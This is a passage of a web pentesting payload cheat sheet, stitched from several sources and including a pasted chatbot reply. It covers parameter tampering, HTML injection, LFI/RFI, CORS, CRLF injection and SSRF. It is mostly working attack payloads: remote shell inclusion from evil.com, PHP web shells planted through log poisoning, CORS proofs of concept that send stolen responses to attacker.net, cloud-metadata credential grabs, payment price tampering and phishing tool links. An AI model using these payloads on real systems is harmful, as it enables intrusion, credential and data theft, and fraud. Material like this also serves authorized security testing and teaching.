| Ruby on Rails                                   | Last occurrence          | b               |

### Parameter Pollution Payloads

* Duplicate Parameters:

    ```ps1
    param=value1&param=value2
    ```

* Array Injection:

    ```ps1
    param[]=value1
    param[]=value1&param[]=value2
    param[]=value1&param=value2
    param=value1&param[]=value2
    ```

* Encoded Injection:

    ```ps1
    param=value1%26other=value2
    ```

* Nested Injection:

    ```ps1
    param[key1]=value1&param[key2]=value2
    ```

* JSON Injection:

    ```ps1
    {
        "test": "user",
        "test": "admin"
    }
    ```

# 5. Parameter Tampering (All Parameters Change)

**Description:** The Web Parameter Tampering attack is based on the manipulation of parameters exchanged between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etc. Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase application functionality and control. 

The parameter modification of form fields can be considered a typical example of Web Parameter Tampering attack. 
For example, consider a user who can select 
Form field values (combo box, check box, etc.) on an application page. When these values are submitted by the user, they could be acquired and arbitrarily manipulated by an attacker. 

**Targeted Parameters:**
```
mainly : price,amount,cost,discount,quantity, transaction  any user id's(priviledge escalation),number,strings,quality,delivery charges discounts etc... to change the parameters and forwards request to payment gateway.
using money we can search in burp if it is matches change the amount or above parameters then and intercept off.

Priviledge escalation attack senario login into account one for admin and another normal user in different browsers. access few admin resource similar to normal user function and paste that url in normal user browser if the normal user able to access admin functionalities there is a vulnerability.
```

### Attack Scenarios:
#### Example 1:
```
Qty=500&price=100  →  Qty=5&price=100
```
#### Example 2:
```
Cashback=0&amt=100 & qty=1
Cashback=100000&amt=100 & qty=1 there is parameter tempering on cashback
```
#### Example 3:
Modify the request in Burp Suite before the payment gateway.
do the nessasary steps and before an application is going to payment gateway do it there like send the request to repeater then change the amount. have to drop a  packet.
we can use the -amount also  such as 100  --99

### Bypass Methods:
1. sometimes amount should be encoding so copy the url and decode to change amount after that encode the payload
2. while leads to priviledge escalation for example normal user login into an application goto values like amount or profile information update if the cookie is weak configured goto inspect element-->storage-->change values like false-->true or change amount....
3. porfile pic upload with malicious link and geo-location
---
# 6. HTML Injection

**Description:** HTML injection occurs when an attacker can inject arbitrary HTML code into a vulnerable web page.

### Payloads: 1. Hyderlink click 2. html payload
```html
<h1>Vulnerable for HTML Injection</h1>
<A HREF="http://bing.com/">OffensiveHunter</A>
```

**DOM HTML Injection Example:**
```html
<script>
function setMessage(){
 var t=location.hash.slice(1);
 document.getElementById(t).innerText = "The DOM is now loaded and can be manipulated.";
}
window.onload = setMessage;
</script>
<a href="#message"> Show Here</a>
<div id="message">Showing Message</div>
```

---

# 7. Local File Inclusion (LFI) and Remote File Inclusion (RFI)

### **Impact of File Inclusion:**
1. Code execution on the server
2. Code execution on the client side
3. Denial of Service (DoS) attacks
4. Information disclosure (passwords, usernames, system files)

### **Common LFI Parameters:**
```
file, document, folder, root, path, pg, style, pdf, template, php_path, doc, content, static
```

### **Basic LFI Exploitation:**

## Summary

- [Tools](#tools)
- [Local File Inclusion](#local-file-inclusion)
    - [Null Byte](#null-byte)
    - [Double Encoding](#double-encoding)
    - [UTF-8 Encoding](#utf-8-encoding)
    - [Path Truncation](#path-truncation)
    - [Filter Bypass](#filter-bypass)
- [Remote File Inclusion](#remote-file-inclusion)
    - [Null Byte](#null-byte-1)
    - [Double Encoding](#double-encoding-1)
    - [Bypass allow_url_include](#bypass-allow_url_include)
- [Labs](#labs)
- [References](#references)

## Tools

- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool

## Local File Inclusion

**File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.

Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### Null Byte

:warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

**Example**: Joomla! Component Web TV 1.0 - CVE-2010-1470

```ps1
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### Double Encoding

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 Encoding

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### Path Truncation

On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.

```powershell
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### Filter Bypass

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## Remote File Inclusion

> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.

Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP 5.

```ini
allow_url_include = On
```

Most of the filter bypasses from LFI section can be reused for RFI.

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Null Byte

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### Double Encoding

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### Bypass allow_url_include

When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.

1. Create a share open to everyone
2. Write a PHP code inside a file : `shell.php`
3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
### **Basic RFI Exploitation:**
```bash
http://example.com/index.php?page=http://evil.com/shell.txt
```

### **LFI/RFI Bypass Techniques:**
- **Null byte injection:** `page=../../../etc/passwd%00`
- **Double encoding:** `page=%252e%252e%252fetc%252fpasswd`
- **PHP wrappers:** `php://filter/convert.base64-encode/resource=index.php`

**Tools:**
- [Kadimus](https://github.com/P0cL4bs/Kadimus)
- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [fimap](https://github.com/kurobeats/fimap)

etc/passwd
etc/passwd%00
etc%2fpasswd
etc%2fpasswd%00
etc%5cpasswd
etc%5cpasswd%00
etc%c0%afpasswd
etc%c0%afpasswd%00
C:\boot.ini
C:\WINDOWS\win.ini
C:/apache2/log/access_log
C:/apache2/log/error.log
C:/apache2/log/error_log
C:/documents and settings/administrator/desktop/desktop.ini

## LFI to RCE via /proc/*/fd

1. Upload a lot of shells (for example : 100)
2. Include `/proc/$PID/fd/$FD` where `$PID` is the PID of the process and `$FD` the filedescriptor. Both of them can be bruteforced.

```ps1
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

## LFI to RCE via /proc/self/environ

Like a log file, send the payload in the `User-Agent` header, it will be reflected inside the `/proc/self/environ` file

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
## LFI to RCE via upload

If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```
## LFI to RCE via phpinfo()

PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.

> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.

Use the script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

### RCE via SSH

Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

Then include the SSH log files inside the Web Application.

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### RCE via Mail

First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

In some cases you can also send the email with the `mail` command line.

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### RCE via Apache logs

Poison the User-Agent in access logs:

```ps1
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.

Then request the logs via the LFI and execute your command.

```ps1
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

---

# 10. Missing or Insufficient SPF Record

**Description:** If a domain lacks an SPF record, attackers can send phishing emails that appear legitimate.

### **Tools:**
- [MXToolbox](https://mxtoolbox.com/)
- [SPF Validator](https://www.kitterman.com/spf/validate.html)

### **Exploitation Example:**
```text
From: support@hubspot.net
To: victim@gmail.com
Subject: Email Forgery due to missing SPF
```

**Phishing Tools:**
- [Emkei.cz](https://emkei.cz/)
- [Anonymous Email](https://anonymousemail.me/)
- [5YMail](https://www.5ymail.com/)

---
# CORS (Cross-Origin Resource Sharing) Security Testing Guide

## 1. Testing CORS Misconfigurations (Origin Reflection) | https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

**Common vulnerable parameters:**

| Parameter | Description |
|-----------|-------------|
| `Origin` | Header used to validate request source |
| `Access-Control-Allow-Origin` | Response header that defines allowed origins |
| `Access-Control-Allow-Credentials` | Enables cookies/auth headers in cross-origin requests |
| `Access-Control-Allow-Methods` | Allowed HTTP methods (GET, POST, etc.) |
| `Access-Control-Allow-Headers` | Allowed custom headers |
| `Access-Control-Max-Age` | Caching duration for preflight responses |

---### 🔥 Bypass Techniques (Adapted from your GitHub repos)

| Technique | Description | Example |
|----------|-------------|---------|
| **Reflected Origin** | Server echoes attacker’s `Origin` | `Origin: https://evil.com` |
| **Regex Bypass** | Exploit loose regex like `.*trusted.com` | `Origin: https://trusted.com.evil.com` |
| **Null Origin** | Use sandboxed iframe or data URI | `Origin: null` |
| **Subdomain Takeover** | Host payload on trusted subdomain | `Origin: https://sub.trusted.com` | `Origin: http://sub.trusted.com` |
| **Credentialed Requests** | Exploit `Access-Control-Allow-Credentials: true` | Combine with reflected origin |
| **Special Characters** | Use `%`, `@`, `` ` `` to bypass regex | `Origin: https://trusted.com%.evil.com` |

## Tools

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool

# **1. List of Vulnerabilities (CORS Attack Surface)**

* **1.1 `Access-Control-Allow-Origin: *` with Sensitive Data**
  Any website can read API responses.

* **1.2 Reflection of Origin Header**
  Server reflects `Origin:` header blindly.

* **1.3 `Access-Control-Allow-Credentials: true` with Wildcard**
  Allows attacker sites to steal authenticated data.

* **1.4 Weak Domain Whitelist**
  `.example.com` allows `attacker-example.com`.

* **1.5 Null Origin Trust**
  Trusting `Origin: null` (sandboxed iframes, file://).

* **1.6 Subdomain Takeover → CORS Abuse**
  Application trusts subdomains that are hijackable.

* **1.7 Misconfigured Allowed Headers**
  Allowing attacker-controlled custom headers.

* **1.8 Misconfigured Allowed Methods**
  Exposing sensitive endpoints to `PUT`, `DELETE`, etc.

* **1.9 Preflight Request Bypass**
  Forcing browser to skip OPTIONS checks.

* **1.10 JSONP + CORS Combination**
  Leaks data even without CORS.

---

# **2. Sample Payloads (Core Attack Payloads)**

(Simple, safe-to-read examples for testing)

### **2.1 Basic Exploit JavaScript (Reads Sensitive Data)**

```js
fetch("https://victim.com/api/user", {
  credentials: "include"
})
.then(r => r.text())
.then(d => console.log(d));
```

### **2.2 Malicious Website HTML PoC**

```html
<script>
fetch("https://victim.com/api/profile", {credentials: "include"})
  .then(resp => resp.text())
  .then(data => alert(data));
</script>
```

### **2.3 Origin Reflection Test**

Send request with:

```
Origin: https://evil.com
```

If response contains:

```
Access-Control-Allow-Origin: https://evil.com
```

→ Vulnerable.

### **2.4 Null-Origin Test**

Send:

```
Origin: null
```

If server allows:

```
Access-Control-Allow-Origin: null
```

→ Vulnerable.

---

# **3. Bypass Payloads (Advanced Techniques)**

### **3.1 Subdomain Bypass**

Server whitelist:

```
Access-Control-Allow-Origin: *.example.com
```

Attacker uses:

```
evil.example.com
```

### **3.2 Wildcard With Credentials**

If server sends:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Browser blocks normally, BUT attackers use **header splitting**:

```
Origin: https://evil.com:443/
```

### **3.3 Case Manipulation**

```
Origin: HTTPS://EVIL.COM
```

Some servers match case-insensitive incorrectly.

### **3.4 Null-Origin Bypass via sandboxed iframe**

```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>
fetch('https://victim.com/api',{credentials:'include'})
.then(r=>r.text()).then(alert);
</script>"></iframe>
```

### **3.5 Broken Regex Whitelist**

Whitelist:

```
/.*example\.com$/
```

Attacker:

```
https://example.com.evil.net
```

### **3.6 JSON Content-Type Bypass**

```js
fetch("https://victim.com/secret", {
  method: "POST",
  headers: {"Content-Type": "text/plain"},
  body: "test"
})
```

### **3.7 Forbidden Header Bypass**

Server incorrectly allows:

```
Access-Control-Allow-Headers: *
```

Attacker sets:

```
X-Api-Key: evil
```

---

# **4. Updated With Realistic Testing Payloads (Advanced Learning)**

### **4.1 Database Exposure (User Data)**

```js
fetch("https://victim.com/api/v1/users/me", {
  credentials: "include"
})
.then(r => r.json())
.then(console.log);
```

### **4.2 Payment Endpoint Access**

```js
fetch("https://victim.com/payment/history", {
  credentials: "include"
}).then(r => r.text()).then(console.log);
```

### **4.3 Token Leaking via CORS**

```js
fetch("https://victim.com/auth/token", {
  credentials: "include"
}).then(r => r.json()).then(alert);
```

### **4.4 Preflight Abuse**

```js
fetch("https://victim.com/internal/admin", {
  method: "PUT",
  headers: {
    "X-Custom": "test"
  },
  credentials: "include"
})
```

### **4.5 Hijacked Subdomain Exploit**

```js
fetch("https://sub.victim.com/admin/logs", {credentials:'include'})
.then(r=>r.text())
.then(console.log);
```

---

# **5. Validation / Test Steps**

**Step 1:** Send request with custom Origin
→ check reflected `Access-Control-Allow-Origin`.

**Step 2:** Test credentialed requests
→ `credentials: include`.

**Step 3:** Test allowed methods and headers
→ `PUT`, `DELETE`, `X-Custom-Header`.

**Step 4:** Try null-origin
→ `Origin: null`.

**Step 5:** Try subdomain and bypass patterns
→ wildcard, regex, IPv6, encoded origins.

---

# **6. Expected Results / Impact**

* Theft of **user data**, **tokens**, **sessions**.
* Access to internal admin APIs.
* Full account takeover through authenticated CORS misuse.
* Payment history leakage.
* Internal network exposure via SSRF-like effects.

---

#### Proof Of Concept

This PoC requires that the respective JS script is hosted at `evil.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

or

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```
### Wildcard Origin without Credentials

If the server responds with a wildcard origin `*`, **the browser does never send the cookies**. However, if the server does not require authentication, it's still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet. The attacker's website can then pivot into the internal network and access the server's data without authentication.

```powershell
* is the only wildcard origin
https://*.example.com is not valid
```

#### Vulnerable Implementation

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

#### Proof Of Concept

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```
### Expanding the Origin

Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.

#### Vulnerable Implementation (Example 1)

In this scenario any prefix inserted in front of `example.com` will be accepted by the server.

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```
#### Vulnerable Implementation (Example 2)

In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```
# CRLF Injection

## Methodology

HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.

**CRLF Characters**:

* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.

By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:

* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
* Cache Poisoning: Forcing incorrect content to be stored in caches.
* Header Manipulation: Altering headers to mislead users or systems

### Session Fixation

A typical HTTP response header looks like this:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```

If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

Now the attacker has set their own cookie.

### Cross Site Scripting

Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).

**Requested page**:

```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```
```
http://www.example.net/index.php?lang=en
Content-Length: 0
 
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34
 
<html>You have been Phished</html>
```

**HTTP response**:

```http
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .

**Requested page**:

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```
```
http://example.com/
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
//..
```
**HTTP Response**:

```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

### Open Redirect

Inject a `Location` header to force a redirect for the user.

```ps1
%0d%0aLocation:%20http://myweb.com
```

## Filter Bypass

[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset.

> Newly defined header fields SHOULD limit their field values to US-ASCII octets.

Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.

| UTF-8 Character | Hex | Unicode | Stripped |
| --------- | --- | ------- | -------- |
| `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
| `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
| `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
| `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<)  |

The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.

An example payload using UTF-8 characters would be:

```js
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

URL encoded version

```js
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```

### Exploitation Examples:
#### Add a Cookie:
```
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```
#### Bypass XSS Protection:
```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a<svg onload=alert(document.domain)>
```
#### Write HTML Response:
```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

## 3. Server-Side Request Forgery (SSRF)

### Exploitation Techniques:
1. Abuse trust:
   ```
   any.com/index/php?uri=http://external.com
   ```
2. Bypass IP whitelisting:
   ```
   any.com/index/php?uri=file:/etc/passwd
   ```
3. Scan internal networks:
   ```
   any.com/index/php?uri=http://localhost:1
   ```
4. Cloud metadata extraction:
   ```
   http://169.254.169.254/latest/meta-data/
   ```
Of course, Anvesh. Here’s a **structured agenda-wise SSRF test case list** that can guide your pilot testing workflow. This format is built to flow logically from basic discovery to advanced exploitation and bypass techniques—perfect for methodical execution or automation planning.

## 🧪 SSRF Pilot Testing Agenda

Common parameters to checks: url, uri, dest, destination, redirect, redir, next, data, callback, return, site, domain, feed, host, hostname, port, path, reference, page, continue, window, out, view, show, navigation, to, target, rurl, rlink, link, img_url, file, source, img_src, download_url, proxy, load_url, open, forward, post_url, request_url

### 🧭 1. Initial Recon & Target Parameter Discovery
- Identify all user-controlled URL parameters in GET/POST requests
- Map potential SSRF sinks:
  - PDF rendering
  - Avatar uploads
  - Webhooks

### 🔎 2. Basic SSRF Functionality Tests
- Loopback access: `http://127.0.0.1/`
- Internal IP probes: `http://192.168.0.1/status`
- Public endpoints for comparison: `http://example.com`

### ☁️ 3. Cloud Metadata Endpoint Abuse
- AWS: `http://169.254.169.254/latest/meta-data/`
- GCP: `http://metadata.google.internal/`
- Azure: `http://169.254.169.254/metadata/instance`

### 🌐 4. DNS / Out-of-Band SSRF Detection
- Monitor using Burp Collaborator or Interactsh
- Test external endpoint: `http://<your-collab>.domain.com`

### 🔁 5. Redirect-Based SSRF
- Open redirect chaining to SSRF sinks
- Short URL abuse or redirection misdirections

### 🧮 6. IP Format Obfuscation
- Decimal: `http://2130706433`
- Octal: `http://0177.1`
- Hex: `http://0x7f000001`
- IPv6: `http://[::ffff:127.0.0.1]`

### 🧪 7. Protocol Smuggling Techniques
- Gopher: `gopher://127.0.0.1/_INFO`
- File: `file:///etc/passwd`
- Dict, FTP, LDAP (if supported)

### 🧬 8. SSRF via Alternate Injection Vectors
- Headers: `Host`, `Referer`, `X-Forwarded-For`
- Cookies: `url=http://127.0.0.1`
- POST Body: JSON/XML SSRF injection
- XXE payloads: `<!ENTITY x SYSTEM "http://127.0.0.1">`

### 🖼️ 9. Business Logic Exploits
- Avatar/image fetching endpoints
- PDF generation using user-provided URLs
- Callback/webhook abuse in CI/CD integrations

### 🚪 10. Bypass & Evasion Techniques
- CIDR whitelist evasion: `127.0.0.1.nip.io`
- DNS rebinding attacks
- Header spoofing via internal proxies

# **1. List of Vulnerabilities (SSRF Attack Surface)**

* **1.1 Internal Network Port Scanning** – attacker probes internal hosts.
* **1.2 Accessing Cloud Metadata Services** – AWS, GCP, Azure.
* **1.3 File Retrieval via Protocol Abuse** – `file://`, `gopher://`, `dict://`, `ftp://`.
* **1.4 Blind SSRF** – no response body but side-effects (DNS/HTTP logs).
* **1.5 URL Bypass via Encoding** – double encoding, IP obfuscation.
* **1.6 Open Redirect SSRF** – redirects to internal targets.
* **1.7 Header Injection via SSRF** – using gopher/dict protocols.
* **1.8 DNS Rebinding** – external domain resolves to internal address.
* **1.9 Host Validation Bypass** – malformed URLs to confuse parsers.
* **1.10 SSRF → RCE or Database Exposure** – access admin panels, APIs, Redis, Docker.

---

# **2. Sample Payloads (Core Attack Payloads)**

(Simple structure for learning — safe to read, no harmful effects)

### **2.1 Internal Network Scan**

```
http://127.0.0.1:22
http://localhost:3306
http://192.168.1.10:8080
```

### **2.2 Cloud Metadata Access**

```
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
```

### **2.3 Protocol Abuse**

```
file:///etc/passwd
gopher://127.0.0.1:11211/
ftp://127.0.0.1/etc/passwd
```

### **2.4 Open Redirect SSRF**

```
http://example.com/redirect?url=http://169.254.169.254/
```

### **2.5 URL Parser Bypass**

```
http://127.0.0.1@evil.com
http://127.0.0.1:80#evil.com
http://2130706433     (integer form of 127.0.0.1)
```

---

# **3. Bypass Payloads (Advanced Techniques)**

(Used when the app blocks "localhost", "127.0.0.1", etc.)

### **3.1 Encoded Localhost**

```
http://127.0.0.1
http://127.1
http://0
```

### **3.2 Double/Triple Encoding**

```
http://%31%32%37.0.0.1
http://%32%31%33%30%37%30%36%34%33%33   (integer representation)
```

### **3.3 DNS Rebinding Payload**

```
http://yourdomain.com       (A record → external, CNAME → internal)
```

### **3.4 “@” Authentication Bypass Trick**

```
http://evil.com@127.0.0.1/
```

### **3.5 IPv6-Only Bypass**

```
http://[::1]/
http://[0000:0000:0000:0000:0000:ffff:127.0.0.1]/
```

### **3.6 Open Redirect Chain**

```
http://attacker.com/redirect?to=http://169.254.169.254/
```

### **3.7 Gopher Protocol for Header Injection**

```
gopher://127.0.0.1:11211/_stats
gopher://127.0.0.1:6379/_INFO
```

---

# **4. Updated With Realistic Testing Payloads (Advanced Learning)**

### **4.1 AWS EC2 Metadata Dump**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### **4.2 Redis RCE Trigger (Safe string shown)**

```
gopher://127.0.0.1:6379/_SET test "Hello"
```

### **4.3 Docker API Exposure**

```
http://localhost:2375/containers/json
```

### **4.4 Kubernetes API Exposure**

```
http://127.0.0.1:10250/pods
```

### **4.5 Jenkins Script Console**

```
http://localhost:8080/script
```

### **4.6 VM Metadata via Redirect**

```
http://open-redirect.com/?url=http://169.254.169.254/latest/
```

### **4.7 Blind SSRF DNS Callback**

```
http://abc.your-burp-collab.com
```

---

# **5. Validation / Test Steps**

**Step 1:** Identify any parameter accepting a URL
→ `url=`, `image=`, `callback=`, `redirect=`, `feed=`, etc.

**Step 2:** Test internal access
→ `http://localhost`, `http://127.0.0.1`, etc.

**Step 3:** Try metadata service
→ `169.254.169.254`

**Step 4:** Try protocol shifts
→ `file://`, `gopher://`, `ftp://`

**Step 5:** Try bypass techniques
→ encodings, redirects, IPv6, DNS rebinding.

---

# **6. Expected Results / Impact**

* Internal systems become reachable.
* Metadata services leak secrets.
* Admin portals exposed.
* Redis/Memcached/DB exploitation.
* Possible **RCE** in chained scenarios.
  
### Testing with Burp Collaborator:
1. Open Burp Collaborator.
2. Set interaction poll.
3. Inject payload in a vulnerable parameter:
   ```
